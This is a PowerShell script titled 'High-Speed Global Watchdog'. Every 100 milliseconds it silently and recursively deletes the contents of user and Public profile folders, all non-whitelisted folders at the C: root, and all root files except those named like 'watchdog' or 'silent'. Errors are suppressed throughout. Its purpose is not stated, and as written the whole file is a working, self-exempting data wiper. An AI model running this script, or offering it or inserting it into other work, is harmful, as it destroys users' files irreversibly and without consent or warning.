# High-Speed Global Watchdog
$userRoots = @($env:USERPROFILE, $env:PUBLIC)
$whitelist = @("Windows", "Program Files", "Program Files (x86)", "Users", "PerfLogs", "Company", "Recovery", "$Recycle.Bin", "System Volume Information")

while($true) {
    # 1. Clean all User & Public subfolders (Desktop, Documents, etc.)
    foreach ($root in $userRoots) {
        Get-ChildItem -Path $root -Directory | Where-Object { $_.Name -ne "AppData" } | ForEach-Object {
            Get-ChildItem -Path "$($_.FullName)\*" -Force -Recurse | Remove-Item -Recurse -Force -ErrorAction SilentlyContinue
        }
    }

    # 2. Clean C:\ Root (Folders)
    Get-ChildItem -Path "C:\" -Directory | Where-Object { $whitelist -notcontains $_.Name } | ForEach-Object {
        Remove-Item -Recurse -Force $_.FullName -ErrorAction SilentlyContinue
    }

    # 3. Clean C:\ Root (Files)
    Get-ChildItem -Path "C:\" -File | Where-Object { $_.Name -notmatch "watchdog|silent" } | Remove-Item -Force -ErrorAction SilentlyContinue

    # Extreme speed check
    Start-Sleep -Milliseconds 100
}